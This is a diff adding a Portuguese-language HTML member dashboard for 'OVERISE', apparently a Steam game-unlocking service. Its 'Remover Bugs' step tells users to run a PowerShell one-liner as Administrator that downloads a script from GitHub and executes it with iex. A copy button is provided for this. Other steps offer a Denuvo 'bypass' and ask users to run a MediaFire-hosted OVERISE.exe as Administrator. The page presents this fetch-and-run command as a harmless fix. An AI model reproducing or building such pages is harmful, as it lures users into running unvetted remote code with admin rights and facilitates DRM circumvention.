@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>OVERISE | Área do Membro</title>
+  
+  <!-- Fontes Premium -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+    /* --- DESIGN SYSTEM (DASHBOARD) --- */
+    :root {
+      --bg: #09090b;
+      --sidebar: #050505;
+      --card: #121212;
+      --border: #27272a;
+      --text: #e4e4e7;
+      --neon: #00FF41;
+      --neon-dim: rgba(0, 255, 65, 0.1);
+      --font: 'Inter', sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      font-family: var(--font);
+      display: flex;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* --- SIDEBAR --- */
+    .sidebar {
+      width: 260px;
+      background-color: var(--sidebar);
+      border-right: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      padding: 30px 20px;
+      position: fixed;
+      height: 100vh;
+      z-index: 100;
+    }
+
+    .logo {
+      font-size: 1.5rem;
+      font-weight: 900;
+      color: #fff;
+      text-transform: uppercase;
+      margin-bottom: 40px;
+      letter-spacing: -1px;
+    }
+    .logo span { color: var(--neon); }
+
+    .nav-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 15px;
+      color: #71717a;
+      text-decoration: none;
+      font-weight: 600;
+      border-radius: 8px;
+      margin-bottom: 5px;
+      transition: 0.2s;
+      cursor: pointer;
+    }
+
+    .nav-item:hover, .nav-item.active {
+      background-color: #18181b;
+      color: #fff;
+    }
+    
+    .nav-item.active { border-left: 3px solid var(--neon); border-radius: 4px 8px 8px 4px; }
+
+    .user-profile {
+      margin-top: auto;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding-top: 20px;
+      border-top: 1px solid var(--border);
+    }
+    .avatar {
+      width: 36px; height: 36px;
+      background: var(--neon);
+      border-radius: 50%;
+      color: #000;
+      display: flex; align-items: center; justify-content: center;
+      font-weight: 800;
+    }
+    .user-info div { font-size: 0.85rem; font-weight: 700; color: #fff; }
+    .user-info span { font-size: 0.7rem; color: var(--neon); display: block; }
+
+    /* --- MAIN CONTENT --- */
+    .main {
+      flex: 1;
+      margin-left: 260px;
+      padding: 40px;
+    }
+
+    .header-title {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-bottom: 40px;
+    }
+    .header-title h1 { font-size: 1.8rem; color: #fff; }
+    .date-badge { 
+        background: #18181b; padding: 6px 12px; border-radius: 6px; 
+        font-size: 0.8rem; color: #a1a1aa; border: 1px solid var(--border);
+    }
+
+    /* GRID DASHBOARD */
+    .dashboard-grid {
+      display: grid;
+      grid-template-columns: 2fr 1fr;
+      gap: 30px;
+    }
+
+    /* CARDS GERAIS */
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 30px;
+      margin-bottom: 30px;
+      position: relative;
+      overflow: hidden;
+    }
+    .card h3 { color: #fff; margin-bottom: 15px; font-size: 1.1rem; }
+
+    /* --- MÓDULO PASSO 1 (STEAM) --- */
+    .step-card {
+        background: radial-gradient(circle at top right, #1a237e 0%, #121212 60%); 
+        border: 1px solid #3f3f46;
+        display: flex; align-items: center; justify-content: space-between;
+        cursor: pointer; transition: 0.3s;
+    }
+    .step-card:hover { border-color: #66c0f4; transform: translateY(-3px); }
+    
+    .step-info { max-width: 70%; }
+    .step-number { 
+        font-size: 0.7rem; font-weight: 900; color: #66c0f4; text-transform: uppercase; 
+        letter-spacing: 1px; margin-bottom: 8px; display: block;
+    }
+    .step-btn-action {
+        background: #66c0f4; color: #000; width: 40px; height: 40px;
+        border-radius: 50%; display: flex; align-items: center; justify-content: center;
+        font-size: 1.2rem; font-weight: bold; box-shadow: 0 0 20px rgba(102, 192, 244, 0.4);
+    }
+
+    /* --- MÓDULO PASSO 2 (SCRIPT) --- */
+    .script-box-card {
+        background: radial-gradient(circle at top right, #2b1c04 0%, #121212 60%);
+        border: 1px solid #d97706;
+        display: flex; align-items: center; justify-content: space-between;
+        cursor: pointer; transition: 0.3s;
+    }
+    .script-box-card:hover { border-color: #f59e0b; transform: translateY(-3px); }
+    
+    .step-number-orange { 
+        font-size: 0.7rem; font-weight: 900; color: #f59e0b; text-transform: uppercase; 
+        letter-spacing: 1px; margin-bottom: 8px; display: block;
+    }
+    .step-btn-action-orange {
+        background: #f59e0b; color: #000; width: 40px; height: 40px;
+        border-radius: 50%; display: flex; align-items: center; justify-content: center;
+        font-size: 1.2rem; font-weight: bold; box-shadow: 0 0 20px rgba(245, 158, 11, 0.4);
+    }
+
+    /* --- MÓDULO PASSO 3 (BYPASS) --- */
+    .bypass-box-card {
+        background: radial-gradient(circle at top right, #3f0945 0%, #121212 60%);
+        border: 1px solid #d946ef;
+        display: flex; align-items: center; justify-content: space-between;
+        cursor: pointer; transition: 0.3s;
+    }
+    .bypass-box-card:hover { border-color: #f0abfc; transform: translateY(-3px); }
+
+    .step-number-purple { 
+        font-size: 0.7rem; font-weight: 900; color: #d946ef; text-transform: uppercase; 
+        letter-spacing: 1px; margin-bottom: 8px; display: block;
+    }
+    .step-btn-action-purple {
+        background: #d946ef; color: #000; width: 40px; height: 40px;
+        border-radius: 50%; display: flex; align-items: center; justify-content: center;
+        font-size: 1.2rem; font-weight: bold; box-shadow: 0 0 20px rgba(217, 70, 239, 0.4);
+    }
+
+    /* --- MÓDULO PASSO 4 (LAUNCHER) --- */
+    .download-box {
+        display: flex; justify-content: space-between; align-items: center;
+        background: radial-gradient(circle at right, #0f2e15 0%, #121212 60%);
+        cursor: pointer; /* Agora é clicável para abrir modal */
+    }
+    .download-box:hover { border-color: var(--neon); }
+
+    .dl-info p { color: #a1a1aa; font-size: 0.9rem; max-width: 400px; margin-bottom: 20px; }
+    
+    .btn-download {
+        background: var(--neon); color: #000;
+        padding: 15px 30px; border-radius: 8px; font-weight: 800;
+        text-transform: uppercase; border: none; cursor: pointer;
+        display: flex; align-items: center; gap: 10px;
+        transition: 0.3s;
+    }
+    .btn-download:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(0,255,65,0.3); }
+
+    /* STATUS SIDE */
+    .status-card { text-align: center; }
+    .status-circle {
+        width: 100px; height: 100px; border-radius: 50%;
+        border: 4px solid var(--neon); margin: 0 auto 20px;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 2rem; color: var(--neon); background: var(--neon-dim);
+        box-shadow: 0 0 30px rgba(0,255,65,0.1);
+    }
+    .status-badge {
+        background: var(--neon-dim); color: var(--neon);
+        padding: 5px 12px; border-radius: 50px; font-size: 0.8rem; font-weight: 700;
+        border: 1px solid var(--neon); display: inline-block; margin-top: 10px;
+    }
+
+    /* COMMUNITY CARD */
+    .community-card {
+        background: #25D366; /* WhatsApp Green */
+        color: #000;
+        text-align: center;
+    }
+    .community-card h3 { color: #000; margin-bottom: 10px; }
+    .community-card p { color: #000; font-weight: 600; font-size: 0.9rem; margin-bottom: 20px; }
+    .btn-whatsapp {
+        background: #fff; color: #25D366; width: 100%; padding: 12px; border-radius: 8px;
+        font-weight: 900; border: none; cursor: pointer; text-transform: uppercase;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.2); transition: 0.3s;
+    }
+    .btn-whatsapp:hover { transform: scale(1.05); }
+
+    /* MODAIS (GERAL) */
+    dialog {
+        background: #111; color: #fff; border: 1px solid #333; border-radius: 16px;
+        padding: 0; width: 90%; max-width: 700px;
+        box-shadow: 0 0 100px rgba(0,0,0,0.9);
+        position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+    }
+    dialog::backdrop { background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); }
+
+    .modal-header {
+        padding: 20px 30px; border-bottom: 1px solid #222;
+        display: flex; justify-content: space-between; align-items: center;
+        background: #0f0f0f;
+    }
+    .modal-close { 
+        background: transparent; border: none; color: #fff; font-size: 1.5rem; cursor: pointer; 
+    }
+    .modal-body { padding: 30px; }
+
+    /* VIDEO CONTAINER */
+    .video-container {
+        width: 100%; aspect-ratio: 16/9; background: #000;
+        display: flex; align-items: center; justify-content: center;
+        position: relative; border-bottom: 1px solid #222;
+    }
+    .play-btn-fake {
+        width: 70px; height: 70px; background: rgba(255,255,255,0.1); border-radius: 50%;
+        display: flex; align-items: center; justify-content: center; color: #fff; font-size: 2rem;
+        border: 2px solid #fff; cursor: pointer; transition: 0.3s;
+    }
+    .play-btn-fake:hover { background: var(--neon); border-color: var(--neon); color: #000; }
+
+    /* BOTÕES DENTRO DO MODAL */
+    .btn-steam-official {
+        display: block; width: 100%; text-align: center;
+        background: #171a21; color: #fff; padding: 15px; border-radius: 8px;
+        text-decoration: none; font-weight: bold; border: 1px solid #333;
+        display: flex; align-items: center; justify-content: center; gap: 10px;
+        transition: 0.3s;
+    }
+    .btn-steam-official:hover { background: #66c0f4; color: #000; border-color: #66c0f4; }
+
+    .script-code {
+        background: #000; padding: 15px; border-radius: 8px; border: 1px solid #333;
+        font-family: monospace; color: #00FF41; font-size: 0.85rem;
+        word-break: break-all; margin-bottom: 15px; user-select: all;
+    }
+    .btn-copy {
+        width: 100%; padding: 15px; background: #d97706; color: #000; border-radius: 8px;
+        font-weight: 800; border: none; cursor: pointer; font-size: 0.9rem;
+        display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .btn-copy:hover { background: #fff; }
+
+    .btn-bypass {
+        width: 100%; padding: 15px; background: #d946ef; color: #000; border-radius: 8px;
+        font-weight: 800; border: none; cursor: pointer; font-size: 0.9rem;
+        display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .btn-bypass:hover { background: #fff; }
+
+    /* MODAL LAUNCHER (VIDEO) */
+    .btn-launcher-download {
+        display: block; width: 100%; text-align: center;
+        background: var(--neon); color: #000; padding: 15px; border-radius: 8px;
+        text-decoration: none; font-weight: bold; border: none; cursor: pointer;
+        display: flex; align-items: center; justify-content: center; gap: 10px;
+        transition: 0.3s;
+    }
+    .btn-launcher-download:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(0,255,65,0.3); }
+
+    @media (max-width: 900px) {
+        .sidebar { display: none; }
+        .main { margin-left: 0; }
+        .dashboard-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="logo">OVER<span>ISE</span></div>
+    <nav>
+        <div class="nav-item active">🏠 Início</div>
+        <div class="nav-item">📥 Downloads</div>
+        <div class="nav-item">📚 Tutoriais</div>
+        <div class="nav-item">💬 Suporte</div>
+    </nav>
+    <div class="user-profile">
+        <div class="avatar">C</div>
+        <div class="user-info">
+            <div>Cliente VIP</div>
+            <span>Licença Vitalícia</span>
+        </div>
+    </div>
+  </aside>
+
+  <!-- MAIN -->
+  <main class="main">
+    <div class="header-title">
+        <h1>Painel do Cliente</h1>
+        <div class="date-badge">Servidor: Online 🟢</div>
+    </div>
+
+    <div class="dashboard-grid">
+        
+        <div class="left-col">
+            
+            <!-- PASSO 1: INSTALAÇÃO DA STEAM -->
+            <div class="card step-card" onclick="openModal('steam')">
+                <div class="step-info">
+                    <span class="step-number">PASSO 01 - OBRIGATÓRIO</span>
+                    <h3>Instalar a Steam Oficial</h3>
+                    <p style="color:#aaa; font-size:0.9rem">Antes de tudo, tenha a plataforma instalada e atualizada.</p>
+                </div>
+                <div class="step-btn-action">➜</div>
+            </div>
+
+            <!-- PASSO 2: OTIMIZAÇÃO (SCRIPT) -->
+            <div class="card script-box-card" onclick="openModal('script')">
+                <div class="step-info">
+                    <span class="step-number-orange">PASSO 02 - CORREÇÃO</span>
+                    <h3>Remover Bugs (PowerShell)</h3>
+                    <p style="color:#aaa; font-size:0.9rem">Evite erros de permissão executando nosso script de limpeza.</p>
+                </div>
+                <div class="step-btn-action-orange">⚙️</div>
+            </div>
+
+             <!-- PASSO 3: BYPASS (OPCIONAL) -->
+             <div class="card bypass-box-card" onclick="openModal('bypass')">
+                <div class="step-info">
+                    <span class="step-number-purple">PASSO 03 - OPCIONAL</span>
+                    <h3>Instalar Bypass (Denuvo)</h3>
+                    <p style="color:#aaa; font-size:0.9rem">Necessário apenas para jogar títulos específicos Online.</p>
+                </div>
+                <div class="step-btn-action-purple">🔓</div>
+            </div>
+
+            <!-- PASSO 4: LAUNCHER (AGORA COM MODAL E VÍDEO) -->
+            <div class="card download-box" onclick="openModal('launcher')">
+                <div class="dl-info">
+                    <span class="step-number" style="color:var(--neon)">PASSO 04 - FINAL</span>
+                    <h3>Baixar Launcher Overise</h3>
+                    <p>Com o sistema pronto, baixe e instale nosso aplicativo.</p>
+                    <button class="btn-download">
+                        <span>⬇</span> BAIXAR OVERISE.EXE
+                    </button>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="right-col">
+            <div class="card status-card">
+                <div class="status-circle">✓</div>
+                <h3>SUA LICENÇA</h3>
+                <p style="color:#888; font-size:0.9rem">Acesso liberado.</p>
+                <div class="status-badge">VITALÍCIO</div>
+            </div>
+            
+            <!-- COMUNIDADE VIP -->
+            <div class="card community-card">
+                <h3>GRUPO VIP</h3>
+                <p>Entre na comunidade oficial no WhatsApp e receba novidades.</p>
+                <button class="btn-whatsapp" onclick="window.open('https://chat.whatsapp.com/SEU_LINK_AQUI', '_blank')">
+                    ENTRAR NO GRUPO
+                </button>
+            </div>
+            
+            <div class="card">
+                <h3>PRECISA DE AJUDA?</h3>
+                <p style="font-size:0.8rem; color:#666; margin-bottom:15px">Suporte técnico disponível no WhatsApp.</p>
+                <button style="width:100%; padding:10px; background:#5865F2; border:none; border-radius:6px; color:white; font-weight:bold; cursor:pointer" onclick="window.open('https://wa.me/5568999215897', '_blank')">
+                    CHAMAR SUPORTE
+                </button>
+            </div>
+        </div>
+
+    </div>
+  </main>
+
+  <!-- MODAL STEAM -->
+  <dialog id="modal-steam">
+      <div class="modal-header">
+          <h3>Passo 1: Instalar Steam</h3>
+          <button class="modal-close" onclick="closeModal('steam')">✕</button>
+      </div>
+      <div class="video-container">
+          <div class="play-btn-fake" onclick="alert('Imagine um vídeo tutorial aqui.')">▶</div>
+      </div>
+      <div class="modal-body">
+          <p style="color:#aaa; line-height:1.6; margin-bottom:20px">
+              Nosso sistema funciona "dentro" da Steam. Siga o vídeo acima para instalar a versão correta.<br><br>
+              1. Clique no botão abaixo para baixar.<br>
+              2. Instale e faça login com sua conta gratuita.
+          </p>
+          <a href="https://store.steampowered.com/about/" target="_blank" class="btn-steam-official">
+              <span style="font-size:1.2rem">☁️</span> BAIXAR STEAM OFICIAL
+          </a>
+      </div>
+  </dialog>
+
+  <!-- MODAL SCRIPT -->
+  <dialog id="modal-script">
+      <div class="modal-header">
+          <h3>Passo 2: Script Anti-Bug</h3>
+          <button class="modal-close" onclick="closeModal('script')">✕</button>
+      </div>
+      <div class="video-container">
+          <div class="play-btn-fake" onclick="alert('Imagine um vídeo tutorial do PowerShell aqui.')">▶</div>
+      </div>
+      <div class="modal-body">
+          <p style="color:#aaa; line-height:1.6; margin-bottom:20px">
+              Para evitar erros de "Acesso Negado", execute este comando rápido:<br><br>
+              1. Copie o código abaixo.<br>
+              2. Abra o menu Iniciar, digite <b>"PowerShell"</b>.<br>
+              3. Clique com botão direito e <b>"Executar como Administrador"</b>.<br>
+              4. Cole o código e dê Enter.
+          </p>
+          
+          <div class="script-code" id="psCode">
+              iwr -useb "https://raw.githubusercontent.com/master18032008/RemoverBugs1/refs/heads/main/Remover-bugs.ps1" | iex
+          </div>
+          
+          <button class="btn-copy" onclick="copyCode()">
+              <span>📋</span> COPIAR CÓDIGO AGORA
+          </button>
+      </div>
+  </dialog>
+
+  <!-- MODAL BYPASS -->
+  <dialog id="modal-bypass">
+    <div class="modal-header">
+        <h3>Passo 3: Instalar Bypass (Opcional)</h3>
+        <button class="modal-close" onclick="closeModal('bypass')">✕</button>
+    </div>
+    <div class="video-container">
+        <div class="play-btn-fake" onclick="alert('Imagine um vídeo tutorial do Bypass aqui.')">▶</div>
+    </div>
+    <div class="modal-body">
+        <p style="color:#aaa; line-height:1.6; margin-bottom:20px">
+            Este passo é necessário apenas se você deseja jogar títulos específicos em modo Online ou que utilizam Denuvo.<br><br>
+            1. Baixe o arquivo abaixo.<br>
+            2. Extraia na pasta raiz do jogo desejado (Siga o vídeo).
+        </p>
+        
+        <button class="btn-bypass" onclick="window.open('SEU_LINK_DO_BYPASS_AQUI', '_blank')">
+            <span>🔓</span> BAIXAR BYPASS (ONLINE FIX)
+        </button>
+    </div>
+</dialog>
+
+  <!-- MODAL LAUNCHER (NOVO) -->
+  <dialog id="modal-launcher">
+      <div class="modal-header">
+          <h3>Passo 4: Instalar o Launcher</h3>
+          <button class="modal-close" onclick="closeModal('launcher')">✕</button>
+      </div>
+      <div class="video-container">
+          <div class="play-btn-fake" onclick="alert('Imagine um vídeo tutorial de instalação do Launcher aqui.')">▶</div>
+      </div>
+      <div class="modal-body">
+          <p style="color:#aaa; line-height:1.6; margin-bottom:20px">
+              Agora vamos instalar o software principal. Siga o vídeo acima para garantir que tudo funcione.<br><br>
+              1. Baixe o arquivo ZIP.<br>
+              2. Extraia e execute o "OVERISE.exe" como Administrador.<br>
+              3. Clique em "Desbloquear Steam".
+          </p>
+          
+          <button class="btn-launcher-download" onclick="window.open('https://www.mediafire.com/file/vwmhnucz94sm5zb/OVERISE.zip/file', '_blank')">
+              <span>⬇</span> BAIXAR OVERISE LAUNCHER
+          </button>
+      </div>
+  </dialog>
+
+  <script>
+      function openModal(type) {
+          document.getElementById(`modal-${type}`).showModal();
+      }
+
+      function closeModal(type) {
+          document.getElementById(`modal-${type}`).close();
+      }
+
+      function copyCode() {
+          const codeText = document.getElementById("psCode").innerText.trim();
+          navigator.clipboard.writeText(codeText).then(() => {
+              alert("Código copiado! Abra o PowerShell como Administrador e cole.");
+          });
+      }
+
+      // Fecha ao clicar fora
+      window.onclick = function(event) {
+          if (event.target.tagName === 'DIALOG') {
+              event.target.close();
+          }
+      }
+  </script>
+
+</body>
+</html>
